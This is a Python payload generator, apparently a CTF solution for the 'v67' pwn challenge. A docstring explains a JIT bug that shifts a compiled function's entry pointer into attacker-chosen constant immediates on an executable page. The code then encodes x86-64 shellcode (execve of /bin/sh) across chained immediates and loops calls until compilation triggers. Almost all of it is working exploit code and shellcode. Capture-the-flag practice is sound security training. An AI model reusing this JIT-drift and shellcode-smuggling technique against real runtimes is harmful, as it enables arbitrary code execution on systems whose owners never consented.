#!/usr/bin/env python3
"""v67 -- flu.xxx CTF 2026, pwn (86 pts).  Payload generator.

Bug: src/jit/x64.rs `emit_fuel_prologue` emits

        movabs rax, &Function
        add    qword [rax+0], instruction_count

but offset 0 of the #[repr(C)] Function is `jit_entry`; `fuel` is at offset 8.
The first *native* call therefore adds `instruction_count` to the function's own
entry pointer, and `vm.rs::invoke` re-reads `native_entry()` on every call, so
the next call starts `instruction_count` bytes into the code.

The code page is mmap(PROT_READ|WRITE|EXEC) and OP_CONST emits its 8-byte
immediate verbatim, so we choose where the drift lands:

    prologue   = 10 (movabs rax,imm64) + 11 (add qword [rax+0],imm32) = 21
    OP_CONST   = 10 (movabs rax,imm64) +  7 (mov [rdi+off32],rax)    = 17
    the k-th immediate starts at native offset 23 + 17k
    Return     = 7 (mov rax,[rdi+off32]) + 1 (ret)

A function with exactly N = 23 + 17k instructions drifts onto its own k-th
immediate; k = 1 -> N = 40 (39 CONSTs + RET).

usage: python3 gen.py [out.v67l]
"""
import struct
import sys

OP_CONST, OP_SUB, OP_STORE = 0x01, 0x04, 0x0F
OP_JMP, OP_JZ, OP_CALL, OP_RET = 0x09, 0x0A, 0x0B, 0x0C


def const(r, v):
    return bytes([OP_CONST, r]) + struct.pack("<q", v)


def sub(d, a, b):
    return bytes([OP_SUB, d, a, b])


def store(addr, src):
    return bytes([OP_STORE, addr, src])


def call(fn, dst, args=0):
    return bytes([OP_CALL]) + struct.pack("<H", fn) + bytes([dst, args])


def ret(r):
    return bytes([OP_RET, r])


def jz(r, rel):
    return bytes([OP_JZ, r]) + struct.pack("<i", rel)


def jmp(rel):
    return bytes([OP_JMP]) + struct.pack("<i", rel)


def function(arity, registers, instrs):
    code = b"".join(instrs)
    return bytes([arity, registers]) + struct.pack("<I", len(code)) + code


# --------------------------------------------------------------- shellcode --
# At the drifted entry the compiled function's arguments are still live:
#   rdi = register file, rsi = heap base, rdx = heap length, rcx = runtime
# The entry function writes "/bin/sh\0" into heap[0] with OP_STORE, so rsi
# already points at the path.  Each CONST immediate gives 8 bytes: 6 bytes of
# code plus "eb 09" to hop over the 7-byte store and the next 10-byte movabs
# (17 bytes in total) into the next immediate.
CHUNKS = [
    b"\x48\x89\xf7\x31\xf6\x90",   # mov rdi, rsi ; xor esi, esi ; nop
    b"\x31\xd2\x6a\x3b\x58\x90",   # xor edx, edx ; push 0x3b ; pop rax ; nop
    b"\x0f\x05\x90\x90\x90\x90",   # syscall ; nops
]
HOP = b"\xeb\x09"

K = 1                        # drift target: CONST #1
NCONST = 39                  # 23 + 17*K == NCONST + 1 == 40
ITERS = 20000                # enough interpreted calls to finish compilation


def imm(chunk):
    assert len(chunk) == 6
    return struct.unpack("<q", chunk + HOP)[0]


def victim():
    """f1: 40 instructions, CONST #1 carries the first shellcode chunk."""
    f1 = []
    for i in range(NCONST):
        j = i - K
        f1.append(const(0, imm(CHUNKS[j]) if 0 <= j < len(CHUNKS) else 0))
    f1.append(ret(0))
    assert len(f1) == 23 + 17 * K == 40
    return f1


def entry():
    """f0: heap[0] = "/bin/sh\0", then call f1 ITERS times."""
    path = struct.unpack("<q", b"/bin/sh\x00")[0]
    prologue = [const(0, path), const(1, 0), store(1, 0),
                const(3, ITERS), const(4, 1)]
    body_call = call(1, 2)
    body_dec = sub(3, 3, 4)
    pro_len = sum(len(i) for i in prologue)
    off_after_jz = pro_len + len(body_call) + len(body_dec) + len(jz(3, 0))
    end_off = off_after_jz + len(jmp(0))
    return prologue + [
        body_call,
        body_dec,
        jz(3, end_off - off_after_jz),      # loop counter == 0 -> ret
        jmp(pro_len - end_off),             # else back to the call
        ret(2),
    ]


def build():
    f0, f1 = entry(), victim()
    return (b"V67L" + bytes([1]) + struct.pack("<H", 2) + struct.pack("<H", 0)
            + function(0, 8, f0) + function(0, 4, f1)), f0, f1


if __name__ == "__main__":
    out = sys.argv[1] if len(sys.argv) > 1 else "exp.v67l"
    blob, f0, f1 = build()
    with open(out, "wb") as fh:
        fh.write(blob)
    print(f"wrote {out}: {len(blob)} bytes; f0={len(f0)} instrs, f1={len(f1)} instrs")
    print(f"drift = {len(f1)} -> native offset of CONST#{K} immediate = {23 + 17 * K}")
